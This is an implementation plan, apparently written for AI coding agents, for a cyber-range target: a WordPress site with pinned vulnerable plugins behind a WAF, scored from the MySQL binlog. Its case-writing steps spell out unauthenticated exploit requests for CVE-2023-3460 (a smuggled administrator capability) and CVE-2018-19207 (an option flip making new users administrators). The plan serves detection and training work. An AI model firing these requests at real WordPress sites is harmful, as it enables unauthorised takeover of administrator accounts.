# WordPress authz target (sub-project B) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a second wargame target — a realistic WordPress company site (`corp`) whose three objectives are unauthenticated broken-access-control CVEs the default WAF cannot see, scored by the platform observing the target's own MySQL binary log.

**Architecture:** A new `wargames/corp/` directory ships an official WordPress image on MySQL (binlog `ROW`) running three pinned vulnerable plugins, included by the top `compose.yaml` and routed behind the shared WAF as the `corp.com` vhost. A new product-space objective model, `effect_observed`, snapshots the target's pre-attack state at session start by querying the `corp-db` MySQL container directly over the estate — the same read-only channel the observe side uses — and, at observe time, reads the MySQL binary log via `mysqlbinlog` inside that same container to credit each objective from the committed row change — never from a detector alert. Nothing is instrumented on the WordPress app itself (the user's explicit choice: read the DB, plant nothing). Three console-fireable HTTP cases drive the CVEs; benign cases give B its own TN > 0.

**Tech Stack:** WordPress (official image) + three wordpress.org SVN-tagged plugins; MySQL 8 (`binlog_format=ROW`); the existing Python/Django platform, nginx+ModSecurity/CRS WAF, Suricata, Elasticsearch; the `mysql` client (baseline snapshot) and `mysqlbinlog` (observe), both shipping with MySQL inside the `corp-db` container — no new pip package; `wp-cli` baked into the WordPress image.

## Global Constraints

Copied verbatim from the spec (`docs/superpowers/specs/2026-10-04-wordpress-authz-objective-design.md`) and CLAUDE.md. **Every task's requirements implicitly include this section.**

- `core_loc` stays **≤ 461**: B's code is product space only. The binlog reader and the `effect_observed` adapter live in `platform/api/` and a wargame module, never in `platform/scoring/`, `platform/ingest/`, `platform/rules/` or `redteam/harness.py`.
- `dependencies` stays **6**: no new pip package. Both target reads run inside the `corp-db` container with tools the MySQL image already ships — the baseline snapshot uses the `mysql` client, the observe uses `mysqlbinlog`.
- `services` (the gated platform compose count) does **not** grow: it stays **7** (`waf`, `suricata`, `elasticsearch`, `filebeat`, `kali`, `proxy`, `platform`). WordPress, its MySQL and the plugins are `wargame_services` (reported, not gated); `wargame_services` grows **2 → 4**.
- `tests` floor only **rises**.
- **The target decides**: objectives are read from the target's own committed DB rows, never from a Suricata/ModSecurity alert. The objective check and the TP/FP/FN/TN detection score stay orthogonal.
- **Every attack is a REST/HTTP request the console can fire** (`POST /api/sessions/<id>/attacks/`). The harness sends only `{method, path, headers, json, params}` — there is **no form `data`**. `harness.py` is core and must not change; see the transport rule in Task B2.0.
- **No code comments or docstrings**, in Python, PHP, YAML, Dockerfiles, nginx conf or shell.
- **Realistic app**: every vulnerability is a real published CVE in an unpatched pinned version. Nothing is a deliberately-planted vulnerable page.
- **Board-only invariants that must not break**: `test/` stays green, TP > 0 and TN > 0; benign cases are never deleted; the board wargame keeps working.

**The wargame id is `corp`.** Its host is `corp.com`. Its case file is `redteam/cases/corp.yaml`. Its services are `fsl-corp-wp` (WordPress) and `fsl-corp-db` (MySQL).

---

## File Structure

Created:

- `wargames/corp/compose.yaml` — the WordPress + MySQL(binlog ROW) services, included by the top `compose.yaml`.
- `wargames/corp/app/Dockerfile` — official WordPress image + `wp-cli` + the three pinned plugin payloads baked in.
- `wargames/corp/app/entrypoint.sh` — waits for MySQL, installs WordPress non-interactively, activates the three plugins, sets Ultimate Member auto-approve, leaves core self-registration **off**, then runs apache.
- (The three pinned plugins are downloaded into the image at build by the Dockerfile — nothing is committed to the repo.)
- `wargames/corp/objectives.yaml` — the three objectives (difficulty 5/4/3) with their `effect` discriminators and a `secret` naming the `corp-db` read channel.
- `deploy/nginx/corp.conf` — the WAF's `corp.com` vhost (Docker); `/internal/` → 404 kept only as harmless defense-in-depth (there is no WordPress `/internal` endpoint).
- `platform/api/effect.py` — the product-space `effect_observed` verifier: state snapshot by read-only `mysql` query in the `corp-db` container, `mysqlbinlog` read + parse, change→tier mapping. Pure functions plus two I/O boundaries, both exec into `corp-db`; no Django imports.
- `redteam/cases/corp.yaml` — the three attack cases + the benign cases.
- Fixtures under `platform/tests/fixtures/` — captured `mysqlbinlog` output per CVE (from B2), used by the parser unit tests.
- New unit tests under `platform/tests/` and acceptance tests under `test/`.

Modified:

- `compose.yaml` (top) — `include:` adds `wargames/corp/compose.yaml`; `waf` gains `depends_on: corp-wp` and the `corp.conf` template mount.
- `platform/wargames.py` — a `corp` entry in `WARGAMES` with `objective_model: effect_observed`.
- `platform/range/declaration.yaml` — roles `corp: fsl-corp-wp` and `corp-db: fsl-corp-db` (Docker flavor), so `substrate().runner("corp-db")` (both the snapshot and the binlog read) and the acceptance suite can reach them.
- `platform/api/views.py` — three gates dispatch on `objective_model`: session-start snapshot, `_observe_objectives`, and the objectives catalogue. `session_loot` keeps refusing non-`loot_verified`.
- `platform/tests/conftest.py` — a `no_real_effect_read` autouse guard mirroring `no_real_board_read`.
- `deploy/waf/range.conf` — the cloud WAF gains the same `corp.com` vhost (kept consistent; acceptance stays Docker-only this session).
- `docs/STATE.md` and `metrics.json` (`bin/measure --save`).

---

## PHASE B1 — the WordPress wargame stack

Front-loads the live bring-up. By the end of B1 the stack comes up with one `docker compose up`, serves `corp.com` through the WAF, and reports the three plugins active — with `services` still 7 and `wargame_services` 4.

### Task B1.1: the `corp` compose services (WordPress + MySQL binlog ROW)

**Files:**
- Create: `wargames/corp/compose.yaml`
- Modify: `compose.yaml` (add `- wargames/corp/compose.yaml` under `include:`; add `corp-wp` to `waf.depends_on`)
- Modify: `platform/range/declaration.yaml` (roles `corp`, `corp-db`)
- Test: `platform/tests/test_corp_compose.py`

**Interfaces:**
- Produces: compose services `corp-wp` (container `fsl-corp-wp`) and `corp-db` (container `fsl-corp-db`), both on the `estate` network only, no published ports; `corp-db` runs MySQL with `--binlog-format=ROW --log-bin=binlog --server-id=1` and no persistent volume; declaration roles `corp -> fsl-corp-wp`, `corp-db -> fsl-corp-db`.

- [ ] **Step 1: Write the failing test**

```python
# platform/tests/test_corp_compose.py
import pathlib

import yaml

from tests import composed

ROOT = pathlib.Path(__file__).resolve().parents[2]


def _corp():
    return yaml.safe_load((ROOT / "wargames/corp/compose.yaml").read_text())["services"]


def test_corp_is_one_folder_the_top_compose_includes():
    included = [str(p.relative_to(composed.ROOT)) for p in composed.files()[1:]]
    assert "wargames/corp/compose.yaml" in included


def test_corp_wp_and_db_stand_inside_the_estate_only_and_publish_nothing():
    services = composed.services()
    for name in ("corp-wp", "corp-db"):
        joined = services[name].get("networks") or []
        assert (joined if isinstance(joined, list) else sorted(joined)) == ["estate"], name
        assert not services[name].get("ports"), f"{name} is published past the WAF"


def test_corp_db_logs_every_committed_row_change():
    command = " ".join(_corp()["corp-db"].get("command") or [])
    assert "--binlog-format=ROW" in command
    assert "--log-bin" in command


def test_corp_db_keeps_no_persistent_volume_so_each_rebuild_is_clean():
    assert not _corp()["corp-db"].get("volumes"), (
        "corp-db declares a persistent volume; a binlog and seeded state would "
        "survive a rebuild and a prior session's change could be replayed"
    )


def test_corp_wp_does_not_keep_wp_content_on_a_volume():
    assert not _corp()["corp-wp"].get("volumes"), (
        "a wp-content volume would shadow the plugins baked into the image"
    )
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_compose.py -v`
Expected: FAIL — `wargames/corp/compose.yaml` does not exist.

- [ ] **Step 3: Create `wargames/corp/compose.yaml`**

```yaml
# wargames/corp/compose.yaml
services:
  corp-wp:
    platform: linux/amd64
    build: ./app
    container_name: fsl-corp-wp
    depends_on:
      corp-db: {condition: service_healthy}
    networks: [estate]
    environment:
      WORDPRESS_DB_HOST: "corp-db"
      WORDPRESS_DB_NAME: "wordpress"
      WORDPRESS_DB_USER: "wordpress"
      WORDPRESS_DB_PASSWORD: "wordpress"
      FSL_WP_URL: "http://corp.com"
    healthcheck:
      test: ["CMD", "wp", "core", "is-installed", "--allow-root", "--path=/var/www/html"]
      interval: 10s
      timeout: 5s
      retries: 30
      start_period: 90s

  corp-db:
    platform: linux/amd64
    image: mysql@sha256:0744ee5ef89ce6ccfa13de3e579fe6b9e27f93dd70da9c06d2c908b1b193fb8d
    container_name: fsl-corp-db
    networks: [estate]
    command: ["--binlog-format=ROW", "--log-bin=binlog", "--server-id=1"]
    environment:
      MYSQL_RANDOM_ROOT_PASSWORD: "yes"
      MYSQL_DATABASE: "wordpress"
      MYSQL_USER: "wordpress"
      MYSQL_PASSWORD: "wordpress"
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "127.0.0.1", "-uwordpress", "-pwordpress"]
      interval: 10s
      timeout: 5s
      retries: 30
      start_period: 30s
```

Reuse the same pinned MySQL digest the board uses (`test_corp_compose` and `test_compose.test_the_database_is_pinned_by_digest` both expect a `@sha256:` MySQL). The WordPress image is built locally in Task B1.2, so it is not pinned by digest here.

- [ ] **Step 4: Add the include and the WAF dependency to the top `compose.yaml`**

Under the existing `include:` block (`compose.yaml` line ~62):

```yaml
include:
  - wargames/board/compose.yaml
  - wargames/corp/compose.yaml
```

In the `waf` service `depends_on:` (currently only `board`):

```yaml
    depends_on:
      board: {condition: service_healthy}
      corp-wp: {condition: service_healthy}
```

- [ ] **Step 5: Add the Docker roles to `platform/range/declaration.yaml`**

Under `roles:` (not the `openstack:` overlay), add:

```yaml
  corp: fsl-corp-wp
  corp-db: fsl-corp-db
```

Do **not** add a top-level `hosts:` entry for corp this session (B is Docker-only; a `hosts:` entry is only for the OpenStack image build and would trip `declared.check()`'s setup/image requirement). The roles alone let `substrate().runner("corp-db")` resolve on Docker and let `test/range.py` reach the hosts by role.

- [ ] **Step 6: Run the test to verify it passes**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_compose.py tests/test_declaration.py tests/test_compose.py -v`
Expected: PASS. `test_declaration.test_the_declaration_and_the_stack_that_realises_it_agree` must stay green (the new roles map to containers the included compose defines).

- [ ] **Step 7: Confirm the metric split**

Run: `bin/measure`
Expected: `services` 7 (unchanged, `=`), `wargame_services` 4 (`^ baseline 2`, not gated). `core_loc` unchanged.

- [ ] **Step 8: Commit**

```bash
git add wargames/corp/compose.yaml compose.yaml platform/range/declaration.yaml platform/tests/test_corp_compose.py
git commit -m "feat(corp): WordPress + binlog-ROW MySQL as a new wargame stack"
```

---

### Task B1.2: the WordPress image with three pinned vulnerable plugins

**Files:**
- Create: `wargames/corp/app/Dockerfile`
- Create: `wargames/corp/app/entrypoint.sh`
- Create: `wargames/corp/app/.dockerignore`
- Test: `platform/tests/test_corp_image.py`

**Interfaces:**
- Produces: an image whose running container, after `entrypoint.sh`, has WordPress installed (admin user `admin`), the three plugins **active**, Ultimate Member auto-approve on, core `users_can_register` **0** and `default_role` `subscriber`. No read endpoint is added to WordPress; the platform reads baseline state and the binlog from the `corp-db` container (Tasks B3.3, B3.5).

**Pinned plugin versions (from the wordpress.org plugin SVN tags):**
- `ultimate-member` **2.6.6** — https://plugins.svn.wordpress.org/ultimate-member/tags/2.6.6/ (CVE-2023-3460)
- `wp-gdpr-compliance` **1.4.2** — https://plugins.svn.wordpress.org/wp-gdpr-compliance/tags/1.4.2/ (CVE-2018-19207)
- `easy-post-submission` **2.3.0** — https://plugins.svn.wordpress.org/easy-post-submission/tags/2.3.0/ (CVE-2026-4431)

- [ ] **Step 1: Write the failing test**

```python
# platform/tests/test_corp_image.py
import pathlib
import re

ROOT = pathlib.Path(__file__).resolve().parents[2]
APP = ROOT / "wargames/corp/app"

PLUGINS = {
    "ultimate-member": "2.6.6",
    "wp-gdpr-compliance": "1.4.2",
    "easy-post-submission": "2.3.0",
}


def test_the_image_is_an_official_wordpress_tag():
    dockerfile = (APP / "Dockerfile").read_text()
    assert re.search(r"^FROM wordpress:\S+", dockerfile, re.M), dockerfile


def test_each_plugin_is_pinned_to_its_vulnerable_version():
    text = (APP / "Dockerfile").read_text()
    for slug, version in PLUGINS.items():
        assert re.search(rf"{re.escape(slug)}[/.]{re.escape(version)}\b", text), (slug, version)


def test_the_entrypoint_activates_the_three_plugins_and_leaves_core_registration_off():
    entry = (APP / "entrypoint.sh").read_text()
    for slug in PLUGINS:
        assert f"plugin activate {slug}" in entry or f"--activate" in entry, slug
    assert "users_can_register 0" in entry
    assert "default_role subscriber" in entry


def test_nothing_is_added_to_the_wordpress_app_for_reads():
    assert not (APP / "mu-plugins").exists(), (
        "the platform reads state from the corp-db container, not from a WP "
        "endpoint; nothing is instrumented on the app"
    )
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_image.py -v`
Expected: FAIL — the files do not exist.

- [ ] **Step 3: Write `wargames/corp/app/Dockerfile`**

```dockerfile
FROM wordpress:6.6.2-php8.2-apache

RUN set -eux; \
    curl -fsSL -o /usr/local/bin/wp https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli-2.11.0.phar; \
    chmod +x /usr/local/bin/wp

RUN set -eux; \
    mkdir -p /tmp/plugins; \
    for pv in ultimate-member/2.6.6 wp-gdpr-compliance/1.4.2 easy-post-submission/2.3.0; do \
      slug="${pv%%/*}"; ver="${pv##*/}"; \
      curl -fsSL -o "/tmp/${slug}.zip" "https://downloads.wordpress.org/plugin/${slug}.${ver}.zip"; \
      unzip -q "/tmp/${slug}.zip" -d /usr/src/wordpress/wp-content/plugins/; \
    done

COPY entrypoint.sh /usr/local/bin/fsl-entrypoint.sh
RUN chmod +x /usr/local/bin/fsl-entrypoint.sh

ENTRYPOINT ["/usr/local/bin/fsl-entrypoint.sh"]
CMD ["apache2-foreground"]
```

Notes for the implementer:
- The `downloads.wordpress.org/plugin/<slug>.<version>.zip` URL serves the exact SVN tag's build and pins the version. If a download 404s or a later bytes-rebuild is a concern, swap that line to an SVN export of the tag (`apt-get install -y subversion && svn export https://plugins.svn.wordpress.org/<slug>/tags/<version> ...`); both pin the vulnerable version. Record whichever you used — no new pip dependency either way.
- The base WordPress image copies `/usr/src/wordpress` into the webroot on first run; baking plugins into `/usr/src/wordpress/wp-content/plugins` makes them appear with no volume (Task B1.1 forbids a wp-content volume).
- Pin `wp-cli` by its versioned phar URL (shown) so the build is reproducible.

- [ ] **Step 4: Write `wargames/corp/app/entrypoint.sh`**

```sh
#!/bin/bash
set -euo pipefail

docker-entrypoint.sh apache2-foreground &
APACHE_PID=$!

cd /var/www/html
for i in $(seq 1 60); do
  if wp core is-installed --allow-root >/dev/null 2>&1; then break; fi
  if ! wp db check --allow-root >/dev/null 2>&1; then sleep 2; continue; fi
  wp core install --allow-root \
    --url="${FSL_WP_URL}" --title="Northwind Community" \
    --admin_user=admin --admin_password=corp-admin-pass \
    --admin_email=admin@corp.com --skip-email && break
  sleep 2
done

wp plugin activate ultimate-member wp-gdpr-compliance easy-post-submission --allow-root
wp option update users_can_register 0 --allow-root
wp option update default_role subscriber --allow-root
wp option patch update um_options account_tab_password 1 --allow-root >/dev/null 2>&1 || true
wp eval 'UM()->options()->update("registration_status","approved");' --allow-root >/dev/null 2>&1 || true

wait "$APACHE_PID"
```

Notes:
- The exact Ultimate Member auto-approve option key (`registration_status`/`um_registration_...`) must be confirmed against UM 2.6.6 in B1.3; the goal is "a new registration is live immediately, no email activation, no admin review." If the `wp eval` key differs, set it from `wp option get um_options` output. No comments in the shipped file.
- `admin` is the baseline administrator; its id is what every rogue-admin objective must differ from.

- [ ] **Step 5: Write `wargames/corp/app/.dockerignore`**

```
*.zip
```

- [ ] **Step 6: Run the test to verify it passes**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_image.py -v`
Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add wargames/corp/app platform/tests/test_corp_image.py
git commit -m "feat(corp): WordPress image with three pinned vulnerable plugins"
```

---

### Task B1.3: route `corp.com` behind the WAF and prove the stack live

**Files:**
- Create: `deploy/nginx/corp.conf`
- Modify: `compose.yaml` (`waf` service: mount `corp.conf` template)
- Modify: `deploy/waf/range.conf` (cloud vhost, kept consistent)
- Test: `platform/tests/test_corp_waf.py`, `test/test_corp_site.py`

**Interfaces:**
- Consumes: `corp-wp` on `estate` (B1.1), the WordPress image (B1.2).
- Produces: the WAF answers `Host: corp.com` by proxying to `http://corp-wp:80`; `GET /` returns 200 through the WAF; the `/internal/` → 404 block stays as harmless defense-in-depth (no WordPress `/internal` endpoint exists); the baseline reads over the `corp-db` container; the three plugins report active.

- [ ] **Step 1: Write the failing unit test**

```python
# platform/tests/test_corp_waf.py
import re
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
CORP_CONF = ROOT / "deploy/nginx/corp.conf"
RANGE_CONF = ROOT / "deploy/waf/range.conf"


def test_the_docker_corp_vhost_serves_corp_com_and_404s_internal():
    conf = CORP_CONF.read_text()
    assert "server_name corp.com;" in conf
    assert "corp-wp" in conf
    assert re.search(r"location\s+/internal/\s*\{\s*return\s+404;", conf), conf
    assert "default_server" not in conf


def test_the_cloud_waf_404s_internal_in_the_corp_server_block():
    text = RANGE_CONF.read_text()
    blocks = re.findall(r"server\s*\{.*?\n\}", text, flags=re.DOTALL)
    corp = [b for b in blocks if "corp-wp" in b]
    assert corp, "range.conf has no corp vhost"
    for block in corp:
        assert re.search(r"location\s+/internal/\s*\{\s*return\s+404;", block), block
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_waf.py -v`
Expected: FAIL — `deploy/nginx/corp.conf` does not exist.

- [ ] **Step 3: Write `deploy/nginx/corp.conf`**

```nginx
server {
    listen 80;
    server_name corp.com;

    location /internal/ {
        return 404;
    }

    location / {
        client_max_body_size 0;
        set $corp_upstream http://corp-wp:80;
        proxy_pass $corp_upstream$request_uri;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_http_version 1.1;
    }

    include includes/location_common.conf;
}
```

This mirrors `deploy/nginx/board.conf` but is **not** `default_server` (the board vhost keeps that). The WAF serves `corp.com` by Host header; the attack TCP target stays `http://board.com` (the WAF) with `Host: corp.com`, so no new DNS alias is needed. The `/internal/` → 404 block is kept only as harmless defense-in-depth and matches the board vhost — WordPress serves no `/internal` route and the platform never reads state through the WAF. No comments in the shipped conf.

- [ ] **Step 4: Mount the template into the `waf` service**

In `compose.yaml`, in the `waf` service `volumes:`, after the `board.conf` line add:

```yaml
      - ./deploy/nginx/corp.conf:/etc/nginx/templates/conf.d/corp.conf.template:ro
```

The owasp CRS image renders every `*.template` under `/etc/nginx/templates/` to `/etc/nginx/conf.d/`, so both vhosts load. `corp.conf` uses only nginx `set` variables, no env, so no `envsubst` escaping is needed.

- [ ] **Step 5: Add the matching cloud vhost to `deploy/waf/range.conf`**

Append a second `server { ... }` block mirroring the board's but for `corp.com` → `http://corp-wp:80`, with the `/internal/` 404 and no `default_server`. Keep acceptance Docker-only this session; this edit only keeps the cloud WAF conf consistent and satisfies `test_corp_waf.test_the_cloud_waf_404s_internal_in_the_corp_server_block`.

- [ ] **Step 6: Run the unit test to verify it passes**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_waf.py -v`
Expected: PASS.

- [ ] **Step 7: Bring up the live stack**

```bash
colima start --profile fsl 2>/dev/null || true
docker compose up -d --build
```

Wait for `fsl-corp-wp` to be healthy:

```bash
docker compose ps corp-wp corp-db
docker compose logs corp-wp | tail -40
```

- [ ] **Step 8: Write and run the live acceptance test**

```python
# test/test_corp_site.py
from range import ATTACKER, run


def test_the_corp_site_serves_through_the_waf():
    probe = run(ATTACKER, [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
        "-H", "Host: corp.com", "http://board.com/",
    ])
    assert probe.stdout.strip() == "200", probe.output


def test_the_baseline_state_reads_over_the_corp_db_container():
    options = run("corp-db", [
        "mysql", "-N", "-uwordpress", "-pwordpress", "wordpress", "-e",
        "SELECT option_name,option_value FROM wp_options "
        "WHERE option_name IN ('users_can_register','default_role');",
    ]).stdout
    rows = dict(line.split("\t") for line in options.splitlines() if line.strip())
    assert rows.get("users_can_register") == "0"
    assert rows.get("default_role") == "subscriber"

    admins = run("corp-db", [
        "mysql", "-N", "-uwordpress", "-pwordpress", "wordpress", "-e",
        "SELECT user_id FROM wp_usermeta WHERE meta_key='wp_capabilities' "
        "AND meta_value LIKE '%administrator%';",
    ]).stdout
    assert len([x for x in admins.split() if x]) >= 1


def test_the_three_vulnerable_plugins_are_active():
    listed = run("corp", [
        "wp", "plugin", "list", "--status=active", "--field=name", "--allow-root",
    ]).stdout
    active = set(listed.split())
    assert {"ultimate-member", "wp-gdpr-compliance", "easy-post-submission"} <= active, active
```

Run: `cd test && ../.venv/bin/python -m pytest test_corp_site.py -v`
Expected: PASS. If `test_the_three_vulnerable_plugins_are_active` fails because a plugin version did not install or activate, fix the Dockerfile/entrypoint here before proceeding — this is the first reproducibility gate.

- [ ] **Step 9: Full verify and commit**

```bash
bin/verify --fast
git add deploy/nginx/corp.conf deploy/waf/range.conf compose.yaml platform/tests/test_corp_waf.py test/test_corp_site.py
git commit -m "feat(corp): WAF corp.com vhost, corp-db baseline read, live bring-up proven"
```

---

## PHASE B2 — prove each CVE live and write the cases

Front-loads the real risk: that the pinned plugin reproduces the stated DB change **through a request the harness can send**. Do B2.0 first; it governs every case shape.

### Task B2.0: the transport rule (read before writing any case)

**The harness sends only `{method, path, headers, json, params}` and no form `data`; `harness.py` is core and must not change.** Therefore:

- `params` become the URL **query string** (even for `method: POST`). PHP populates `$_GET` and `$_REQUEST` from the query string but **not** `$_POST`.
- `json` sends an `application/json` body. PHP does **not** populate `$_POST` or `$_REQUEST` from a JSON body (only a handler that reads `php://input` and `json_decode`s it sees it).

So every B case must drive a handler that reads its inputs from `$_GET` or `$_REQUEST` (put the payload in `params`), or from `php://input` as JSON (put it in `json`). `admin-ajax.php` dispatches on `$_REQUEST['action']`, so a `nopriv` ajax action is reachable with `params`. **For each CVE below, confirm live that the payload lands via the chosen transport.** If a target CVE's handler reads strictly `$_POST` in a way neither `params` nor `json` can satisfy, do **not** patch the harness — swap to a vetted alternate (listed per task) whose handler reads `$_REQUEST`/`$_GET`, and note the swap in the case file and in `docs/STATE.md`.

Keep the objective filter for every case: **unauthenticated, single request, no SQLi/XSS/traversal signature, not RCE, DB-observable.**

### Task B2.1: CVE-2023-3460 — rogue administrator (Ultimate Member 2.6.6)

**Files:**
- Create: `redteam/cases/corp.yaml` (first cases)
- Create: `platform/tests/fixtures/corp-rogue-admin.binlog` (captured `mysqlbinlog` output)
- Create: `platform/tests/fixtures/corp-columns.json` (confirmed `@N` column positions — shared by B2.1–B2.3)
- Test: `test/test_corp_cve_rogue_admin.py`

**Interfaces:**
- Produces: a malicious case `corp-rogue-admin` (`expect: "wp_capabilities"`) and a benign case `corp-normal-registration`; a captured binlog fixture proving a `wp_usermeta` row grants `administrator` to a new non-baseline user id; the column-position map used by the parser in B3.

- [ ] **Step 1: Reproduce live and capture the exact request**

With the stack up, drive the UM 2.6.6 arbitrary-user-meta registration against `corp.com` through the WAF, smuggling `wp_capabilities[administrator]=1` (per CVE-2023-3460 / Wordfence advisory). Start from the query-string transport:

```bash
docker compose exec platform python3 - <<'PY'
import requests
r = requests.post(
    "http://board.com/",
    headers={"Host": "corp.com"},
    params={
        "um_request": "1",
        # the UM register form fields + the smuggled key; confirm field names
        # from the live UM 2.6.6 register form markup
        "wp_capabilities[administrator]": "1",
    },
    timeout=20,
)
print(r.status_code, len(r.text))
PY
```

Confirm the field names and the exact submit endpoint from the live UM register form (`view-source` of the registration page) before locking the shape. Record the final `{method, path, params/json}` that commits the change.

- [ ] **Step 2: Confirm the committed DB change**

```bash
docker compose exec corp-db mysql -uwordpress -pwordpress wordpress -e \
  "SELECT u.ID,u.user_login FROM wp_users u JOIN wp_usermeta m ON m.user_id=u.ID WHERE m.meta_key='wp_capabilities' AND m.meta_value LIKE '%administrator%';"
```

Expected: a **new** user id (greater than the baseline `admin` id) with `wp_capabilities` containing `administrator`. If instead the attack creates only a subscriber (no admin), the single-request privesc did not reproduce on this build: **swap to the alternate** — ProfilePress / WP User Avatar **CVE-2021-34621** (use **only** the privilege-escalation registration request; **avoid** its sibling file-upload RCE CVE-2021-34622/34623). Re-pin the plugin in `wargames/corp/app/Dockerfile`, re-run B1.2/B1.3, and note the swap in `corp.yaml` and `docs/STATE.md`.

- [ ] **Step 3: Capture the binlog fixture and the column positions**

```bash
docker compose exec corp-db sh -c \
  'mysqlbinlog --base64-output=DECODE-ROWS --verbose /var/lib/mysql/binlog.* 2>/dev/null' \
  > platform/tests/fixtures/corp-rogue-admin.binlog
```

From the fixture, read the `### INSERT INTO \`wordpress\`.\`wp_usermeta\`` and `### INSERT INTO \`wordpress\`.\`wp_users\`` blocks and record which `@N` is `user_id`/`meta_key`/`meta_value` (usermeta) and `ID`/`user_login` (users). Write `platform/tests/fixtures/corp-columns.json`:

```json
{
  "wp_users": {"ID": 1, "user_login": 2},
  "wp_usermeta": {"user_id": 2, "meta_key": 3, "meta_value": 4},
  "wp_options": {"option_name": 2, "option_value": 3},
  "wp_posts": {"ID": 1, "post_status": 8, "post_content": 5, "post_title": 6}
}
```

These positions are the standard WordPress schema order; **confirm each against the live fixtures** (B2.1 for users/usermeta, B2.2 for options, B2.3 for posts) and correct any that differ for this WordPress version. This file is the single source of the parser constants in Task B3.4.

- [ ] **Step 4: Write the cases into `redteam/cases/corp.yaml`**

```yaml
- name: corp-rogue-admin
  malicious: true
  stage: escalate-privileges
  technique: T1068
  pattern: CAPEC-233
  expect: "wp_capabilities"
  correlation: marker
  request:
    method: POST
    path: /
    params:
      um_request: "1"
      wp_capabilities[administrator]: "1"

- name: corp-normal-registration
  malicious: false
  correlation: marker
  request:
    method: POST
    path: /
    params:
      um_request: "1"
      user_login: "newcomer"
      user_email: "newcomer@example.com"
```

Replace `path`/`params` with the exact shape confirmed in Step 1. The benign case is a normal registration (no smuggled capability) and must NOT grant administrator — it exists so B keeps TN > 0. `expect: "wp_capabilities"` ties a true positive to the attack's own mechanism.

- [ ] **Step 5: The case file passes the catalogue check**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_catalogue.py -v`
Expected: PASS — `test_every_case_file_shipped_passes_the_catalogue_check` now parametrizes over `corp.yaml` too.

- [ ] **Step 6: Write and run the live acceptance**

```python
# test/test_corp_cve_rogue_admin.py
import requests

from conftest import PLATFORM_URL
from range import run


def _admin_ids():
    out = run("corp-db", [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        "SELECT user_id FROM wp_usermeta WHERE meta_key='wp_capabilities' "
        "AND meta_value LIKE '%administrator%';",
    ]).stdout
    return {int(x) for x in out.split()}


def test_the_rogue_admin_request_commits_a_new_administrator_row(stack_is_up):
    before = _admin_ids()
    created = requests.post(
        f"{PLATFORM_URL}/api/sessions/", json={"scenario": "corp"}, timeout=120
    )
    session_id = created.json()["id"]
    fired = requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/attacks/",
        json={"case": "corp-rogue-admin"}, timeout=120,
    )
    assert fired.status_code == 201, fired.text
    assert _admin_ids() - before, "no new administrator was committed"
```

Run: `cd test && ../.venv/bin/python -m pytest test_corp_cve_rogue_admin.py -v`
Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add redteam/cases/corp.yaml platform/tests/fixtures/corp-rogue-admin.binlog platform/tests/fixtures/corp-columns.json test/test_corp_cve_rogue_admin.py
git commit -m "feat(corp): CVE-2023-3460 rogue-admin case proven live, binlog fixture captured"
```

---

### Task B2.2: CVE-2018-19207 — admin self-registration flip (WP GDPR Compliance 1.4.2)

**Files:**
- Modify: `redteam/cases/corp.yaml`
- Create: `platform/tests/fixtures/corp-option-flip.binlog`
- Test: `test/test_corp_cve_option_flip.py`

**Interfaces:**
- Produces: a malicious case `corp-option-flip` (`expect: "wpgdprc"`) that flips `wp_options.users_can_register` to `1` and `default_role` to `administrator` via the unauthenticated `admin-ajax` `wpgdprc_process_action`; a binlog fixture of the two `wp_options` updates.

- [ ] **Step 1: Reproduce live via admin-ajax**

The WP GDPR Compliance 1.4.2 flaw lets a `nopriv` `admin-ajax` call set arbitrary options. Drive it through the WAF with the payload in `params` (admin-ajax reads `$_REQUEST['action']`):

```bash
docker compose exec platform python3 - <<'PY'
import requests
for option, value in (("users_can_register", "1"), ("default_role", "administrator")):
    r = requests.post(
        "http://board.com/wp-admin/admin-ajax.php",
        headers={"Host": "corp.com"},
        params={
            "action": "wpgdprc_process_action",
            "security": "",
            "data": '{"type":"save_setting","append":false,"option":"%s","value":"%s"}' % (option, value),
        },
        timeout=20,
    )
    print(option, r.status_code, r.text[:200])
PY
```

The exact `data` shape and nonce handling must be confirmed against 1.4.2 live. If the handler reads the payload only from `$_POST` (not `$_REQUEST`), see B2.0: swap to the alternate **Sitemap by click5 CVE-2022-0952** (unauth option update) and re-pin. Keep the `expect` substring aligned to whichever mechanism ships (`wpgdprc` or `click5`).

- [ ] **Step 2: Confirm the committed change and capture the fixture**

```bash
docker compose exec corp-db mysql -uwordpress -pwordpress wordpress -e \
  "SELECT option_name,option_value FROM wp_options WHERE option_name IN ('users_can_register','default_role');"
docker compose exec corp-db sh -c \
  'mysqlbinlog --base64-output=DECODE-ROWS --verbose /var/lib/mysql/binlog.* 2>/dev/null' \
  > platform/tests/fixtures/corp-option-flip.binlog
```

Expected: `users_can_register=1`, `default_role=administrator`. Confirm the `wp_options` `@N` positions in `corp-columns.json` against this fixture.

- [ ] **Step 3: Add the cases**

```yaml
- name: corp-option-flip
  malicious: true
  stage: escalate-privileges
  technique: T1562
  pattern: CAPEC-122
  expect: "wpgdprc"
  correlation: marker
  request:
    method: POST
    path: /wp-admin/admin-ajax.php
    params:
